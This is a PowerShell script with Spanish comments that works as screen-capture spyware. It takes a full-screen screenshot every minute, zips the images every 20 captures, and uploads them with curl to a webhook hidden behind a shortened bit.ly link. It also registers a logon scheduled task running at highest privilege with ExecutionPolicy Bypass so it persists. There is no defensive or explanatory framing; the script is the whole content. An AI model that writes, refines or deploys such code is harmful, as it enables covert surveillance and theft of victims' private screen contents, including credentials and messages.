# Define la URL del webhook
$hookurl = "https://bit.ly/web_chupakbras"

# Define el intervalo de tiempo en segundos entre capturas de pantalla
$seconds = 60 # Intervalo de captura de pantalla (1 minuto)

# Define la cantidad de capturas por archivo ZIP
$capturesPerZip = 20

# Variable para contar las capturas
$counter = 0

# Función para tomar una captura de pantalla
function TakeScreenshot {
    # Crea un objeto Bitmap para la captura de pantalla
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    
    # Guarda la captura de pantalla en un archivo temporal
    $Filett = "$TempFolder\SC$counter.png"
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    
    # Incrementa el contador
    $counter++
    
    # Envía la captura de prueba si es la primera
    if ($counter -eq 1) {
        Write-Host "Enviando captura de prueba..."
        curl.exe -F "file1=@$Filett" $hookurl
    }
}

# Detectar URL de webhook acortada
if ($hookurl.Ln -ne 121) {
    Write-Host "URL de Webhook acortada detectada.."
    $hookurl = (irm $hookurl).url
}

# Obtiene la resolución de la pantalla
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top

# Crea la carpeta temporal para almacenar las capturas
$TempFolder = "$env:temp\Screenshots"
if (-not (Test-Path -Path $TempFolder)) {
    New-Item -ItemType Directory -Path $TempFolder | Out-Null
}

# Crea la tarea programada para ejecutar el script al iniciar sesión en Windows
$TaskName = "Capturas de pantalla"
$TaskDescription = "Tarea programada para ejecutar el script de captura de pantalla al iniciar sesión en Windows"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File ""$MyInvocation.MyCommand.Definition"""
Register-ScheduledTask -TaskName $TaskName -Description $TaskDescription -Trigger $Trigger -Action $Action -RunLevel Highest -Force

# Realiza la captura de pantalla y envía la captura de prueba
TakeScreenshot

# Bucle principal para continuar capturando y enviando capturas de pantalla
while ($true) {
    # Realiza la captura de pantalla
    TakeScreenshot

    # Si se alcanza el límite de capturas por ZIP, crea y envía el archivo ZIP
    if ($counter % $capturesPerZip -eq 0) {
        $ZipFile = "$TempFolder\Screenshots_$counter.zip"
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($TempFolder, $ZipFile)

        Write-Host "Enviando archivo ZIP..."
        curl.exe -F "file1=@$ZipFile" $hookurl

        # Elimina el archivo ZIP después de enviarlo
        Remove-Item -Path $ZipFile -Force
    }

    # Espera el tiempo definido antes de tomar la siguiente captura de pantalla
    Start-Sleep $seconds
}
